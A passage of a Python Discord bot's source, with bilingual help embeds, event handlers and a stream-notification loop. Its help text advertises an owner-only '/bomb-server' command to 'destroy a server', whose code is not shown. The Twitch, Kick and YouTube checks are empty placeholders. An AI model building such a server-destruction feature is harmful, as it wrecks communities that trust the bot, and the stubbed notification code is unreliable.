            "`/bomb-server` - Destroy a server\n"
            "`/sunucuyu-bombala` - Bir sunucuyu yok et\n"
        ),
        inline=False
    )
    
    # Utility Commands
    embed.add_field(
        name="🔧 Utility Commands",
        value=(
            "`/help` - Show this help message\n"
            "`/yardım` - Yardım mesajını göster\n"
        ),
        inline=False
    )
    
    embed.set_footer(text="Bot Prefix: / • Use /yardım for Turkish help")
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="yardım", description="Kullanılabilir tüm komutları göster")
async def yardım_command(interaction: discord.Interaction):
    """Kullanılabilir tüm komutları göster"""
    embed = discord.Embed(
        title="🤖 Bot Yardım - Kullanılabilir Komutlar",
        description="Kullanabileceğiniz tüm komutlar:",
        color=discord.Color.blue()
    )
    
    # Müzik Komutları
    embed.add_field(
        name="🎵 Müzik Komutları",
        value=(
            "`/çal <url>` - URL'den müzik çal\n"
            "`/duraklat` - Mevcut müziği duraklat\n"
            "`/devam` - Duraklatılmış müziği devam ettir\n"
            "`/atla` - Şuanki şarkıyı atla\n"
            "`/sıra` - Müzik sırasını göster\n"
            "`/döngü` - Sıra döngüsünü aç/kapat\n"
            "`/durdur` - Müziği durdur ve bağlantıyı kes\n"
            "`/ses <1-100>` - Ses seviyesini ayarla\n"
            "`/müzik-menüsü` - Müzik kontrol menüsü\n"
        ),
        inline=False
    )
    
    # Sunucu Kurulum Komutları
    embed.add_field(
        name="🏗️ Sunucu Kurulum Komutları",
        value=(
            "`/sunucu-kurulumu` - Şablonlarla sunucu kur\n"
            "`/server-setup` - Server setup templates\n"
        ),
        inline=False
    )
    
    # Bildirim Komutları
    embed.add_field(
        name="📢 Bildirim Komutları",
        value=(
            "`/twitch-bildirim-kanalı-kurulum` - Twitch bildirimleri\n"
            "`/kick-bildirim-kanalı-kurulum` - Kick bildirimleri\n"
            "`/youtube-bildirim-kanalı-kurulum` - YouTube bildirimleri\n"
            "`/twitch-notification-channel-setup` - Twitch notifications\n"
            "`/kick-notification-channel-setup` - Kick notifications\n"
            "`/youtube-notification-channel-setup` - YouTube notifications\n"
        ),
        inline=False
    )
    
    # Geri Bildirim Komutları
    embed.add_field(
        name="📩 Geri Bildirim Komutları",
        value=(
            "`/geri-bildirim` - Bot sahibine geri bildirim gönder\n"
            "`/feedback` - Send feedback to bot owner\n"
            "`/geri-bildirim-okundu <id> <mesaj>` - Geri bildirime yanıt ver (Sahip)\n"
            "`/feedback-read <id> <message>` - Respond to feedback (Owner)\n"
            "`/dm-yaz <kullanıcı_id> <mesaj>` - Kullanıcıya DM gönder (Sahip)\n"
            "`/write-dm <user_id> <message>` - Send DM to user (Owner)\n"
        ),
        inline=False
    )
    
    # Doğrulama Komutları
    embed.add_field(
        name="🔐 Doğrulama Komutları",
        value=(
            "`/doğrula` - Doğrulama yap\n"
            "`/verify` - Complete verification\n"
        ),
        inline=False
    )
    
    # AI Komutları
    embed.add_field(
        name="🤖 AI Komutları",
        value=(
            "`/ai-bilgi` - AI hizmeti bilgileri\n"
            "`/ai-info` - AI service information\n"
        ),
        inline=False
    )
    
    # Sahip Komutları
    embed.add_field(
        name="⚙️ Sahip Komutları",
        value=(
            "`/geri-bildirim-engelle <kullanıcı_id> <süre>` - Geri bildirimden engelle\n"
            "`/feedback-ban <user_id> <time>` - Ban from feedback\n"
            "`/reset-bot` - Bot verilerini sıfırla\n"
            "`/sunucuyu-bombala` - Bir sunucuyu yok et\n"
            "`/bomb-server` - Destroy a server\n"
        ),
        inline=False
    )
    
    # Yardımcı Komutları
    embed.add_field(
        name="🔧 Yardımcı Komutları",
        value=(
            "`/yardım` - Bu yardım mesajını göster\n"
            "`/help` - Show help message\n"
        ),
        inline=False
    )
    
    embed.set_footer(text="Bot Öneki: / • İngilizce yardım için /help kullanın")
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

# Event: On bot ready
@bot.event
async def on_ready():
    """Called when bot is ready"""
    print(f'✅ {bot.user} has connected to Discord!')
    print(f'📊 Bot is in {len(bot.guilds)} servers')
    
    # Sync commands
    try:
        synced = await bot.tree.sync()
        print(f'✅ Synced {len(synced)} commands')
    except Exception as e:
        print(f'❌ Error syncing commands: {e}')
    
    # Set bot status
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name="/help | Multi-Feature Bot"
        )
    )

# Event: On guild join
@bot.event
async def on_guild_join(guild):
    """Called when bot joins a guild"""
    print(f'✅ Joined new guild: {guild.name} (ID: {guild.id})')
    
    # Find a channel to send welcome message
    welcome_channel = None
    for channel in guild.text_channels:
        if channel.permissions_for(guild.me).send_messages:
            welcome_channel = channel
            break
    
    if welcome_channel:
        embed = discord.Embed(
            title="🤖 Thanks for adding me!",
            description=(
                "Hello! I'm a multi-feature Discord bot with:\n"
                "• 🎵 Music playback\n"
                "• 🏗️ Server setup templates\n"
                "• 📢 Stream notifications\n"
                "• 🔐 Verification system\n"
                "• 📩 Feedback system\n"
                "• ⚙️ And much more!\n\n"
                "**Get started with:**\n"
                "`/verify` - Complete verification first\n"
                "`/help` - See all commands\n"
                "`/server-setup` - Setup your server\n\n"
                "**Note:** Some commands require verification first!"
            ),
            color=discord.Color.blue()
        )
        
        # Create translate view for welcome message
        view = TranslateView(
            "Thanks for adding me! I'm a multi-feature bot with music, server setup, notifications, and more. Use `/verify` to get started!",
            "Beni eklediğiniz için teşekkürler! Müzik, sunucu kurulumu, bildirimler ve daha fazlasına sahip çok özellikli bir botum. Başlamak için `/doğrula` kullanın!"
        )
        
        await welcome_channel.send(embed=embed, view=view)
    
    # Give 10000 Sampy Coin to the user who added the bot (if we can identify them)
    # Note: Discord doesn't provide who added the bot, so we can't implement this directly
    # This would require tracking through audit logs or other methods

# Event: On voice state update
@bot.event
async def on_voice_state_update(member, before, after):
    """Handle voice state updates for temp rooms and idle disconnect"""
    # Temp room handling
    if member.guild.id in temp_rooms and before.channel:
        temp_room_info = temp_rooms[member.guild.id]
        if before.channel.id == temp_room_info['voice_channel_id']:
            # Check if temp room is empty
            voice_channel = before.channel
            if len(voice_channel.members) == 0:
                # Delete temp room after delay
                await asyncio.sleep(5)  # 5 second delay
                voice_channel = bot.get_channel(temp_room_info['voice_channel_id'])
                if voice_channel and len(voice_channel.members) == 0:
                    try:
                        # Delete text channel if exists
                        if temp_room_info['text_channel_id']:
                            text_channel = bot.get_channel(temp_room_info['text_channel_id'])
                            if text_channel:
                                await text_channel.delete()
                        
                        # Delete voice channel
                        await voice_channel.delete()
                        
                        # Remove from temp rooms
                        del temp_rooms[member.guild.id]
                    except:
                        pass
    
    # Music idle disconnect check
    if member.guild.voice_client and member.guild.voice_client.channel:
        if before.channel == member.guild.voice_client.channel:
            # Check if bot is alone in voice channel
            if len(member.guild.voice_client.channel.members) == 1:
                # Start idle timer
                guild_id = member.guild.id
                if guild_id not in idle_timers:
                    idle_timers[guild_id] = asyncio.create_task(
                        idle_disconnect(member.guild, member.guild.voice_client)
                    )

# Background tasks
async def check_stream_notifications():
    """Check for stream notifications in background"""
    await bot.wait_until_ready()
    
    while not bot.is_closed():
        try:
            # Check Twitch streams
            for guild_id, channels in twitch_notifications.items():
                guild = bot.get_guild(guild_id)
                if not guild:
                    continue
                
                for channel_name, data in channels.items():
                    try:
                        # Here you would implement actual Twitch API check
                        # This is a placeholder implementation
                        current_time = datetime.now()
                        last_check = data.get('last_check')
                        
                        # Check every 5 minutes
                        if not last_check or (current_time - last_check).total_seconds() > 300:
                            # Update last check time
                            data['last_check'] = current_time
                            
                            # In a real implementation, you would:
                            # 1. Call Twitch API to check if stream is live
                            # 2. Compare with previous state
                            # 3. Send notification if stream just went live
                            pass
                    
                    except Exception as e:
                        print(f"Twitch notification error for {channel_name}: {e}")
            
            # Check Kick streams
            for guild_id, channels in kick_notifications.items():
                guild = bot.get_guild(guild_id)
                if not guild:
                    continue
                
                for username, data in channels.items():
                    try:
                        # Similar implementation for Kick
                        pass
                    except Exception as e:
                        print(f"Kick notification error for {username}: {e}")
            
            # Check YouTube streams
            for guild_id, channels in youtube_notifications.items():
                guild = bot.get_guild(guild_id)
                if not guild:
                    continue
                
                for channel_id, data in channels.items():
                    try:
                        # Similar implementation for YouTube
                        pass
                    except Exception as e:
                        print(f"YouTube notification error for {channel_id}: {e}")
        
        except Exception as e:
            print(f"Stream notification check error: {e}")
        
        # Wait 60 seconds before next check
        await asyncio.sleep(60)

# Start background tasks
if __name__ == "__main__":
    # Load environment variables
    from dotenv import load_dotenv
    load_dotenv()
    
    TOKEN = os.getenv('DISCORD_TOKEN')
    
    if not TOKEN:
        print("❌ Error: DISCORD_TOKEN not found in environment variables")
        print("Please create a .env file with DISCORD_TOKEN=your_token_here")
    else:
        # Start stream notification checker
        bot.loop.create_task(check_stream_notifications())
        
        # Run the bot
        try:
            bot.run(TOKEN)
        except discord.LoginFailure:
            print("❌ Error: Invalid Discord token")
        except Exception as e:
            print(f"❌ Error starting bot: {e}")